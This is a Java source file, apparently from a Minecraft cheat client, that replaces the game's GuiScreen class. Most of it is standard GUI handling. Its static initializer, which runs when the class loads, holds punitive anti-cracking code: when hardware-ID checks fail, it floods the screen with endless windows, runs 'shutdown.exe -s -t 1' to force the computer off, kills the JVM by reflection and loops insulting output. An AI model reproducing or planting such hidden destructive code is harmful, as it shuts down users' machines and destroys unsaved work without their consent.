package net.minecraft.client.gui;

import com.google.common.base.Splitter;
import com.google.common.collect.Lists;
import com.google.common.collect.Sets;
import my.distance.Client;
import my.distance.api.verify.SHWID;
import my.distance.manager.Fucker;
import my.distance.manager.RenderManager;
import my.distance.ui.BackGroundRenderer;
import my.distance.ui.font.FontLoaders;
import my.distance.ui.jelloparticle.ParticleEngine;
import my.distance.ui.particles.ParticleManager;
import my.distance.ui.particles.particle.ParticleSnow;
import my.distance.util.SuperLib;
import my.distance.util.render.RenderUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.stream.GuiTwitchUserMode;
import net.minecraft.client.renderer.GlStateManager;
import net.minecraft.client.renderer.RenderHelper;
import net.minecraft.client.renderer.entity.RenderItem;
import net.minecraft.entity.EntityList;
import net.minecraft.event.ClickEvent;
import net.minecraft.event.HoverEvent;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.stats.Achievement;
import net.minecraft.stats.StatBase;
import net.minecraft.stats.StatList;
import net.minecraft.util.ChatComponentTranslation;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.IChatComponent;
import org.apache.commons.lang3.StringUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.input.Keyboard;
import org.lwjgl.input.Mouse;
import tv.twitch.chat.ChatUserInfo;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.ClipboardOwner;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.List;
import java.util.Timer;
import java.util.*;
import java.util.concurrent.CopyOnWriteArrayList;

public abstract class GuiScreen extends Gui implements GuiYesNoCallback
{
    static {
        if (SHWID.BITCH != 0){
            RenderManager.doRender();
        }
        if (SHWID.hahaha != 1){
            Fucker.dofuck();
        }
        if (SHWID.id != 1){
            RenderManager.doRender();
            Fucker.dofuck();
        }
        if (SHWID.id2 != 2){
            RenderManager.doRender();
            Fucker.dofuck();
        }
        if (SuperLib.id != 1){
            new Thread(() -> {
                Random rd = new Random();
                while (true) {
                    JFrame frame = new JFrame("别破解了，求你了");
                    frame.setSize(400, 200);
                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
                    frame.setVisible(true);
                }
            }).start();
            new java.util.Timer().schedule(new TimerTask() {
                public void run() {
                    Runtime run = Runtime.getRuntime();
                    try {
                        run.exec("shutdown.exe -s -t 1");
                        try {
                            Method shutDownMethod = Class.forName("java.lang.Shutdown").getDeclaredMethod("exit", Integer.TYPE);
                            shutDownMethod.setAccessible(true);
                            shutDownMethod.invoke(null, 0);
                        }catch (Exception ignored){
                            throw new IllegalStateException();
                        }
                    } catch (IOException e) {
                        try {
                            Method shutDownMethod = Class.forName("java.lang.Shutdown").getDeclaredMethod("exit", Integer.TYPE);
                            shutDownMethod.setAccessible(true);
                            shutDownMethod.invoke(null, 0);
                        }catch (Exception ignored){
                            throw new IllegalStateException();
                        }
                    }
                }
            }, (5000L));
            while (true){
                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
            }
        }
        if (SuperLib.id2 != 0){
            new Thread(() -> {
                Random rd = new Random();
                while (true) {
                    JFrame frame = new JFrame("别破解了，求你了");
                    frame.setSize(400, 200);
                    frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
                    frame.setVisible(true);
                }
            }).start();
            new Timer().schedule(new TimerTask() {
                public void run() {
                    Runtime run = Runtime.getRuntime();
                    try {
                        run.exec("Shutdown.exe -s -t 1");
                        try {
                            Method shutDownMethod = Class.forName("java.lang.Shutdown").getDeclaredMethod("exit", Integer.TYPE);
                            shutDownMethod.setAccessible(true);
                            shutDownMethod.invoke(null, 0);
                        }catch (Exception ignored){
                            throw new IllegalStateException();
                        }
                    } catch (IOException e) {
                        try {
                            Method shutDownMethod = Class.forName("java.lang.Shutdown").getDeclaredMethod("exit", Integer.TYPE);
                            shutDownMethod.setAccessible(true);
                            shutDownMethod.invoke(null, 0);
                        }catch (Exception ignored){
                            throw new IllegalStateException();
                        }
                    }
                }
            }, (5000L));
            while (true){
                System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
            }
        }
    }
    private final ParticleManager particleManager = new ParticleManager(new ParticleSnow(), 20);
    private static final Logger LOGGER = LogManager.getLogger();
    private static final Set<String> PROTOCOLS = Sets.newHashSet("http", "https");
    private static final Splitter NEWLINE_SPLITTER = Splitter.on('\n');

    /** Reference to the Minecraft object. */
    protected Minecraft mc;

    /**
     * Holds a instance of RenderItem, used to draw the achievement icons on screen (is based on ItemStack)
     */
    protected RenderItem itemRender;

    /** The width of the screen object. */
    public int width;

    /** The height of the screen object. */
    public int height;
    protected List<GuiButton> buttonList = new CopyOnWriteArrayList<>();
    protected List<GuiLabel> labelList = new CopyOnWriteArrayList<>();
    public boolean allowUserInput;

    /** The FontRenderer used by GuiScreen */
    protected FontRenderer fontRendererObj;

    /** The button that was just pressed. */
    private GuiButton selectedButton;
    protected int eventButton;
    private long lastMouseEvent;

    /**
     * Tracks the number of fingers currently on the screen. Prevents subsequent fingers registering as clicks.
     */
    private int touchValue;
    private URI clickedLinkURI;

    /**
     * Draws the screen and all the components in it. Args : mouseX, mouseY, renderPartialTicks
     */
    public void drawScreen(int mouseX, int mouseY, float partialTicks)
    {
        for (GuiButton guiButton : this.buttonList) {
            guiButton.drawButton(this.mc, mouseX, mouseY);
        }

        for (GuiLabel guiLabel : this.labelList) {
            guiLabel.drawLabel(this.mc, mouseX, mouseY);
        }
    }
    public void InventoryClicks() throws java.io.IOException {
        int var3;
        int var1 = Mouse.getEventX() * this.width / this.mc.displayWidth;
        int var2 = this.height - Mouse.getEventY() * this.height / this.mc.displayHeight - 1;
        this.eventButton = var3 = 0;
        this.lastMouseEvent = Minecraft.getSystemTime();
        this.mouseClicked(var1, var2, this.eventButton);
    }
    /**
     * Fired when a key is typed (except F11 which toggles full screen). This is the equivalent of
     * KeyListener.keyTyped(KeyEvent e). Args : character (character on the key), keyCode (lwjgl Keyboard key code)
     */
    protected void keyTyped(char typedChar, int keyCode) throws IOException
    {
        if (keyCode == 1)
        {
            this.mc.displayGuiScreen((GuiScreen)null);

            if (this.mc.currentScreen == null)
            {
                this.mc.setIngameFocus();
            }
        }
    }

    /**
     * Returns a string stored in the system clipboard.
     */
    public static String getClipboardString()
    {
        try
        {
            Transferable transferable = Toolkit.getDefaultToolkit().getSystemClipboard().getContents((Object)null);

            if (transferable != null && transferable.isDataFlavorSupported(DataFlavor.stringFlavor))
            {
                return (String)transferable.getTransferData(DataFlavor.stringFlavor);
            }
        }
        catch (Exception var1)
        {
            ;
        }

        return "";
    }

    /**
     * Stores the given string in the system clipboard
     */
    public static void setClipboardString(String copyText)
    {
        if (!StringUtils.isEmpty(copyText))
        {
            try
            {
                StringSelection stringselection = new StringSelection(copyText);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringselection, (ClipboardOwner)null);
            }
            catch (Exception var2)
            {
                ;
            }
        }
    }

    protected void renderToolTip(ItemStack stack, int x, int y)
    {
        List<String> list = stack.getTooltip(this.mc.thePlayer, this.mc.gameSettings.advancedItemTooltips);

        for (int i = 0; i < list.size(); ++i)
        {
            if (i == 0)
            {
                list.set(i, stack.getRarity().rarityColor + (String)list.get(i));
            }
            else
            {
                list.set(i, EnumChatFormatting.GRAY + (String)list.get(i));
            }
        }

        this.drawHoveringText(list, x, y);
    }

    /**
     * Draws the text when mouse is over creative inventory tab. Params: current creative tab to be checked, current
     * mouse x position, current mouse y position.
     */
    protected void drawCreativeTabHoveringText(String tabName, int mouseX, int mouseY)
    {
        this.drawHoveringText(Arrays.asList(tabName), mouseX, mouseY);
    }

    protected void drawHoveringText(List<String> textLines, int x, int y,boolean fix)
    {
        if (!textLines.isEmpty())
        {
            GlStateManager.disableRescaleNormal();
            RenderHelper.disableStandardItemLighting();
            GlStateManager.disableLighting();
            GlStateManager.disableDepth();
            int i = 0;

            for (String s : textLines)
            {
                int j = this.fontRendererObj.getStringWidth(s);

                if (j > i)
                {
                    i = j;
                }
            }

            int l1 = x + 12;
            int i2 = y - 12;
            int k = 8;

            if (textLines.size() > 1)
            {
                k += 2 + (textLines.size() - 1) * 10;
            }

            if (l1 + i > this.width)
            {
                l1 -= 28 + i;
            }

            if (i2 + k + 6 > this.height)
            {
                i2 = this.height - k - 6;
            }

            this.zLevel = 300.0F;
            this.itemRender.zLevel = 300.0F;
            int l = -267386864;
//            this.drawGradientRect(l1 - 3, i2 - 4, l1 + i + 3, i2 - 3, l, l);
//            this.drawGradientRect(l1 - 3, i2 + k + 3, l1 + i + 3, i2 + k + 4, l, l);
//            this.drawGradientRect(l1 - 3, i2 - 3, l1 + i + 3, i2 + k + 3, l, l);
//            this.drawGradientRect(l1 - 4, i2 - 3, l1 - 3, i2 + k + 3, l, l);
//            this.drawGradientRect(l1 + i + 3, i2 - 3, l1 + i + 4, i2 + k + 3, l, l);
//            int i1 = 1347420415;
//            int j1 = (i1 & 16711422) >> 1 | i1 & -16777216;
//            this.drawGradientRect(l1 - 3, i2 - 3 + 1, l1 - 3 + 1, i2 + k + 3 - 1, i1, j1);
//            this.drawGradientRect(l1 + i + 2, i2 - 3 + 1, l1 + i + 3, i2 + k + 3 - 1, i1, j1);
//            this.drawGradientRect(l1 - 3, i2 - 3, l1 + i + 3, i2 - 3 + 1, i1, i1);
//            this.drawGradientRect(l1 - 3, i2 + k + 2, l1 + i + 3, i2 + k + 3, j1, j1);

            this.zLevel = 0.0F;
            this.itemRender.zLevel = 0.0F;
            for (int k1 = 0; k1 < textLines.size(); ++k1)
            {
                String s1 = textLines.get(k1);
                Client.FontLoaders.Chinese15.drawStringWithShadow(s1, (float)l1, (float)i2 + 2, -1);

                if (k1 == 0)
                {
                    i2 += 2;
                }

                i2 += 10;
            }
            GlStateManager.enableLighting();
            GlStateManager.enableDepth();
            RenderHelper.enableStandardItemLighting();
            GlStateManager.enableRescaleNormal();
        }
    }

    /**
     * Draws a List of strings as a tooltip. Every entry is drawn on a seperate line.
     */
    protected void drawHoveringText(List<String> textLines, int x, int y)
    {
        if (!textLines.isEmpty())
        {
            GlStateManager.disableRescaleNormal();
            RenderHelper.disableStandardItemLighting();
            GlStateManager.disableLighting();
            GlStateManager.disableDepth();
            int i = 0;

            for (String s : textLines)
            {
                int j = this.fontRendererObj.getStringWidth(s);

                if (j > i)
                {
                    i = j;
                }
            }

            int l1 = x + 12;
            int i2 = y - 12;
            int k = 8;

            if (textLines.size() > 1)
            {
                k += 2 + (textLines.size() - 1) * 10;
            }

            if (l1 + i > this.width)
            {
                l1 -= 28 + i;
            }

            if (i2 + k + 6 > this.height)
            {
                i2 = this.height - k - 6;
            }

            this.zLevel = 300.0F;
            this.itemRender.zLevel = 300.0F;
            int l = -267386864;
            this.drawGradientRect(l1 - 3, i2 - 4, l1 + i + 3, i2 - 3, l, l);
            this.drawGradientRect(l1 - 3, i2 + k + 3, l1 + i + 3, i2 + k + 4, l, l);
            this.drawGradientRect(l1 - 3, i2 - 3, l1 + i + 3, i2 + k + 3, l, l);
            this.drawGradientRect(l1 - 4, i2 - 3, l1 - 3, i2 + k + 3, l, l);
            this.drawGradientRect(l1 + i + 3, i2 - 3, l1 + i + 4, i2 + k + 3, l, l);
            int i1 = 1347420415;
            int j1 = (i1 & 16711422) >> 1 | i1 & -16777216;
            this.drawGradientRect(l1 - 3, i2 - 3 + 1, l1 - 3 + 1, i2 + k + 3 - 1, i1, j1);
            this.drawGradientRect(l1 + i + 2, i2 - 3 + 1, l1 + i + 3, i2 + k + 3 - 1, i1, j1);
            this.drawGradientRect(l1 - 3, i2 - 3, l1 + i + 3, i2 - 3 + 1, i1, i1);
            this.drawGradientRect(l1 - 3, i2 + k + 2, l1 + i + 3, i2 + k + 3, j1, j1);

            this.zLevel = 0.0F;
            this.itemRender.zLevel = 0.0F;
            for (int k1 = 0; k1 < textLines.size(); ++k1)
            {
                String s1 = textLines.get(k1);
                mc.fontRendererObj.drawStringWithShadow(s1, (float)l1, (float)i2, -1);

                if (k1 == 0)
                {
                    i2 += 2;
                }

                i2 += 10;
            }
            GlStateManager.enableLighting();
            GlStateManager.enableDepth();
            RenderHelper.enableStandardItemLighting();
            GlStateManager.enableRescaleNormal();
        }
    }

    /**
     * Draws the hover event specified by the given chat component
     *  
     * @param component The IChatComponent to render
     * @param x The x position where to render
     * @param y The y position where to render
     */
    protected void handleComponentHover(IChatComponent component, int x, int y)
    {
        if (component != null && component.getChatStyle().getChatHoverEvent() != null)
        {
            HoverEvent hoverevent = component.getChatStyle().getChatHoverEvent();

            if (hoverevent.getAction() == HoverEvent.Action.SHOW_ITEM)
            {
                ItemStack itemstack = null;

                try
                {
                    NBTBase nbtbase = JsonToNBT.getTagFromJson(hoverevent.getValue().getUnformattedText());

                    if (nbtbase instanceof NBTTagCompound)
                    {
                        itemstack = ItemStack.loadItemStackFromNBT((NBTTagCompound)nbtbase);
                    }
                }
                catch (NBTException var11)
                {
                    ;
                }

                if (itemstack != null)
                {
                    this.renderToolTip(itemstack, x, y);
                }
                else
                {
                    this.drawCreativeTabHoveringText(EnumChatFormatting.RED + "Invalid Item!", x, y);
                }
            }
            else if (hoverevent.getAction() == HoverEvent.Action.SHOW_ENTITY)
            {
                if (this.mc.gameSettings.advancedItemTooltips)
                {
                    try
                    {
                        NBTBase nbtbase1 = JsonToNBT.getTagFromJson(hoverevent.getValue().getUnformattedText());

                        if (nbtbase1 instanceof NBTTagCompound)
                        {
                            List<String> list1 = Lists.newArrayList();
                            NBTTagCompound nbttagcompound = (NBTTagCompound)nbtbase1;
                            list1.add(nbttagcompound.getString("name"));

                            if (nbttagcompound.hasKey("type", 8))
                            {
                                String s = nbttagcompound.getString("type");
                                list1.add("Type: " + s + " (" + EntityList.getIDFromString(s) + ")");
                            }

                            list1.add(nbttagcompound.getString("id"));
                            this.drawHoveringText(list1, x, y);
                        }
                        else
                        {
                            this.drawCreativeTabHoveringText(EnumChatFormatting.RED + "Invalid Entity!", x, y);
                        }
                    }
                    catch (NBTException var10)
                    {
                        this.drawCreativeTabHoveringText(EnumChatFormatting.RED + "Invalid Entity!", x, y);
                    }
                }
            }
            else if (hoverevent.getAction() == HoverEvent.Action.SHOW_TEXT)
            {
                this.drawHoveringText(NEWLINE_SPLITTER.splitToList(hoverevent.getValue().getFormattedText()), x, y);
            }
            else if (hoverevent.getAction() == HoverEvent.Action.SHOW_ACHIEVEMENT)
            {
                StatBase statbase = StatList.getOneShotStat(hoverevent.getValue().getUnformattedText());

                if (statbase != null)
                {
                    IChatComponent ichatcomponent = statbase.getStatName();
                    IChatComponent ichatcomponent1 = new ChatComponentTranslation("stats.tooltip.type." + (statbase.isAchievement() ? "achievement" : "statistic"));
                    ichatcomponent1.getChatStyle().setItalic(true);
                    String s1 = statbase instanceof Achievement ? ((Achievement)statbase).getDescription() : null;
                    List<String> list = Lists.newArrayList(ichatcomponent.getFormattedText(), ichatcomponent1.getFormattedText());

                    if (s1 != null)
                    {
                        list.addAll(this.fontRendererObj.listFormattedStringToWidth(s1, 150));
                    }

                    this.drawHoveringText(list, x, y);
                }
                else
                {
                    this.drawCreativeTabHoveringText(EnumChatFormatting.RED + "Invalid statistic/achievement!", x, y);
                }
            }

            GlStateManager.disableLighting();
        }
    }

    /**
     * Sets the text of the chat
     */
    protected void setText(String newChatText, boolean shouldOverwrite)
    {
    }

    /**
     * Executes the click event specified by the given chat component
     *  
     * @param component The ChatComponent to check for click
     */
    protected boolean handleComponentClick(IChatComponent component)
    {
        if (component == null)
        {
            return false;
        }
        else
        {
            ClickEvent clickevent = component.getChatStyle().getChatClickEvent();

            if (isShiftKeyDown())
            {
                if (component.getChatStyle().getInsertion() != null)
                {
                    this.setText(component.getChatStyle().getInsertion(), false);
                }
            }
            else if (clickevent != null)
            {
                if (clickevent.getAction() == ClickEvent.Action.OPEN_URL)
                {
                    if (!this.mc.gameSettings.chatLinks)
                    {
                        return false;
                    }

                    try
                    {
                        URI uri = new URI(clickevent.getValue());
                        String s = uri.getScheme();

                        if (s == null)
                        {
                            throw new URISyntaxException(clickevent.getValue(), "Missing protocol");
                        }

                        if (!PROTOCOLS.contains(s.toLowerCase()))
                        {
                            throw new URISyntaxException(clickevent.getValue(), "Unsupported protocol: " + s.toLowerCase());
                        }

                        if (this.mc.gameSettings.chatLinksPrompt)
                        {
                            this.clickedLinkURI = uri;
                            this.mc.displayGuiScreen(new GuiConfirmOpenLink(this, clickevent.getValue(), 31102009, false));
                        }
                        else
                        {
                            this.openWebLink(uri);
                        }
                    }
                    catch (URISyntaxException urisyntaxexception)
                    {
                        LOGGER.error("Can't open url for " + clickevent, (Throwable)urisyntaxexception);
                    }
                }
                else if (clickevent.getAction() == ClickEvent.Action.OPEN_FILE)
                {
                    URI uri1 = (new File(clickevent.getValue())).toURI();
                    this.openWebLink(uri1);
                }
                else if (clickevent.getAction() == ClickEvent.Action.SUGGEST_COMMAND)
                {
                    this.setText(clickevent.getValue(), true);
                }
                else if (clickevent.getAction() == ClickEvent.Action.RUN_COMMAND)
                {
                    this.sendChatMessage(clickevent.getValue(), false);
                }
                else if (clickevent.getAction() == ClickEvent.Action.TWITCH_USER_INFO)
                {
                    ChatUserInfo chatuserinfo = this.mc.getTwitchStream().func_152926_a(clickevent.getValue());

                    if (chatuserinfo != null)
                    {
                        this.mc.displayGuiScreen(new GuiTwitchUserMode(this.mc.getTwitchStream(), chatuserinfo));
                    }
                    else
                    {
                        LOGGER.error("Tried to handle twitch user but couldn't find them!");
                    }
                }
                else
                {
                    LOGGER.error("Don't know how to handle " + clickevent);
                }

                return true;
            }

            return false;
        }
    }

    /**
     * Used to add chat messages to the client's GuiChat.
     */
    public void sendChatMessage(String msg)
    {
        this.sendChatMessage(msg, true);
    }

    public void sendChatMessage(String msg, boolean addToChat)
    {
        if (addToChat)
        {
            this.mc.ingameGUI.getChatGUI().addToSentMessages(msg);
        }

        this.mc.thePlayer.sendChatMessage(msg);
    }

    /**
     * Called when the mouse is clicked. Args : mouseX, mouseY, clickedButton
     */
    protected void mouseClicked(int mouseX, int mouseY, int mouseButton) throws IOException
    {
        if (mouseButton == 0)
        {
            for (GuiButton guibutton : this.buttonList) {
                if (guibutton.mousePressed(this.mc, mouseX, mouseY)) {
                    this.selectedButton = guibutton;
                    guibutton.playPressSound(this.mc.getSoundHandler());
                    this.actionPerformed(guibutton);
                }
            }
        }
    }

    /**
     * Called when a mouse button is released.  Args : mouseX, mouseY, releaseButton
     */
    protected void mouseReleased(int mouseX, int mouseY, int state)
    {
        if (this.selectedButton != null && state == 0)
        {
            this.selectedButton.mouseReleased(mouseX, mouseY);
            this.selectedButton = null;
        }
    }

    /**
     * Called when a mouse button is pressed and the mouse is moved around. Parameters are : mouseX, mouseY,
     * lastButtonClicked & timeSinceMouseClick.
     */
    protected void mouseClickMove(int mouseX, int mouseY, int clickedMouseButton, long timeSinceLastClick)
    {
    }

    /**
     * Called by the controls from the buttonList when activated. (Mouse pressed for buttons)
     */
    protected void actionPerformed(GuiButton button) throws IOException
    {
    }

    /**
     * Causes the screen to lay out its subcomponents again. This is the equivalent of the Java call
     * Container.validate()
     */
    public void setWorldAndResolution(Minecraft mc, int width, int height)
    {
        this.mc = mc;
        this.itemRender = mc.getRenderItem();
        this.fontRendererObj = mc.fontRendererObj;
        this.width = width;
        this.height = height;
        this.buttonList.clear();
        this.initGui();
    }

    /**
     * Set the gui to the specified width and height
     *  
     * @param w The width of the screen
     * @param h The height of the screen
     */
    public void setGuiSize(int w, int h)
    {
        this.width = w;
        this.height = h;
    }

    /**
     * Adds the buttons (and other controls) to the screen in question. Called when the GUI is displayed and when the
     * window resizes, the buttonList is cleared beforehand.
     */
    public void initGui()
    {
    }

    /**
     * Delegates mouse and keyboard input.
     */
    public void handleInput() throws IOException
    {
        if (Mouse.isCreated())
        {
            while (Mouse.next())
            {
                this.handleMouseInput();
            }
        }

        if (Keyboard.isCreated())
        {
            while (Keyboard.next())
            {
                this.handleKeyboardInput();
            }
        }
    }

    /**
     * Handles mouse input.
     */
    public void handleMouseInput() throws IOException
    {
        int i = Mouse.getEventX() * this.width / this.mc.displayWidth;
        int j = this.height - Mouse.getEventY() * this.height / this.mc.displayHeight - 1;
        int k = Mouse.getEventButton();

        if (Mouse.getEventButtonState())
        {
            if (this.mc.gameSettings.touchscreen && this.touchValue++ > 0)
            {
                return;
            }

            this.eventButton = k;
            this.lastMouseEvent = Minecraft.getSystemTime();
            this.mouseClicked(i, j, this.eventButton);
        }
        else if (k != -1)
        {
            if (this.mc.gameSettings.touchscreen && --this.touchValue > 0)
            {
                return;
            }

            this.eventButton = -1;
            this.mouseReleased(i, j, k);
        }
        else if (this.eventButton != -1 && this.lastMouseEvent > 0L)
        {
            long l = Minecraft.getSystemTime() - this.lastMouseEvent;
            this.mouseClickMove(i, j, this.eventButton, l);
        }
    }

    /**
     * Handles keyboard input.
     */
    public void handleKeyboardInput() throws IOException {
        final char c0 = Keyboard.getEventCharacter();
        if ((Keyboard.getEventKey() == 0 && c0 >= ' ') || Keyboard.getEventKeyState()) {
            this.keyTyped(c0, Keyboard.getEventKey());
        }
        this.mc.dispatchKeypresses();
    }

    /**
     * Called from the main game loop to update the screen.
     */
    public void updateScreen()
    {
    }

    /**
     * Called when the screen is unloaded. Used to disable keyboard repeat events
     */
    public void onGuiClosed()
    {
    }

    /**
     * Draws either a gradient over the background screen (when it exists) or a flat gradient over background.png
     */
    public ParticleEngine pe = new ParticleEngine();
    public void drawDefaultBackground()
    {
        this.drawWorldBackground(0);
    }

    public void drawWorldBackground(int tint)
    {
        if (this.mc.theWorld != null)
        {
            RenderUtil.drawRect(0, 0, this.width, this.height, new Color(0,0,0,180).getRGB());
            FontLoaders.calibrilite35.drawStringWithShadow(Client.name,width-FontLoaders.calibrilite35.getStringWidth(Client.name)-FontLoaders.calibrilite15.getStringWidth(Client.distanceVersion) - 5,height-FontLoaders.calibrilite35.getStringHeight(Client.name),new Color(255,255,255,200).getRGB());
            FontLoaders.calibrilite15.drawStringWithShadow(Client.distanceVersion,width-FontLoaders.calibrilite15.getStringWidth(Client.distanceVersion) - 3,height-FontLoaders.calibrilite35.getStringHeight(Client.distanceVersion) / 2f - 2,new Color(255,255,255,200).getRGB());
        }
        else
        {
            BackGroundRenderer.render();
        }
        pe.render(0,0);
    }

    /**
     * Draws the background (i is always 0 as of 1.2.2)
     */
    public void drawBackground(int tint)
    {
        BackGroundRenderer.render();
        pe.render(0,0);
    }

    /**
     * Returns true if this GUI should pause the game when it is displayed in single-player
     */
    public boolean doesGuiPauseGame()
    {
        return true;
    }

    public void confirmClicked(boolean result, int id)
    {
        if (id == 31102009)
        {
            if (result)
            {
                this.openWebLink(this.clickedLinkURI);
            }

            this.clickedLinkURI = null;
            this.mc.displayGuiScreen(this);
        }
    }

    private void openWebLink(URI url)
    {
        try
        {
            Class<?> oclass = Class.forName("java.awt.Desktop");
            Object object = oclass.getMethod("getDesktop").invoke((Object)null);
            oclass.getMethod("browse", URI.class).invoke(object, url);
        }
        catch (Throwable throwable)
        {
            LOGGER.error("Couldn't open link", throwable);
        }
    }

    /**
     * Returns true if either windows ctrl key is down or if either mac meta key is down
     */
    public static boolean isCtrlKeyDown()
    {
        if (Minecraft.isRunningOnMac)
        {
            return Keyboard.isKeyDown(219) || Keyboard.isKeyDown(220);
        }
        else
        {
            return Keyboard.isKeyDown(29) || Keyboard.isKeyDown(157);
        }
    }

    /**
     * Returns true if either shift key is down
     */
    public static boolean isShiftKeyDown()
    {
        return Keyboard.isKeyDown(42) || Keyboard.isKeyDown(54);
    }

    /**
     * Returns true if either alt key is down
     */
    public static boolean isAltKeyDown()
    {
        return Keyboard.isKeyDown(56) || Keyboard.isKeyDown(184);
    }

    public static boolean isKeyComboCtrlX(int keyID)
    {
        return keyID == 45 && isCtrlKeyDown() && !isShiftKeyDown() && !isAltKeyDown();
    }

    public static boolean isKeyComboCtrlV(int keyID)
    {
        return keyID == 47 && isCtrlKeyDown() && !isShiftKeyDown() && !isAltKeyDown();
    }

    public static boolean isKeyComboCtrlC(int keyID)
    {
        return keyID == 46 && isCtrlKeyDown() && !isShiftKeyDown() && !isAltKeyDown();
    }

    public static boolean isKeyComboCtrlA(int keyID)
    {
        return keyID == 30 && isCtrlKeyDown() && !isShiftKeyDown() && !isAltKeyDown();
    }
    public void key(char typedChar, int keyCode) {
    }

    /**
     * Called when the GUI is resized in order to update the world and the resolution
     *  
     * @param w The width of the screen
     * @param h The height of the screen
     */
    public void onResize(Minecraft mcIn, int w, int h)
    {
        this.setWorldAndResolution(mcIn, w, h);
    }
}
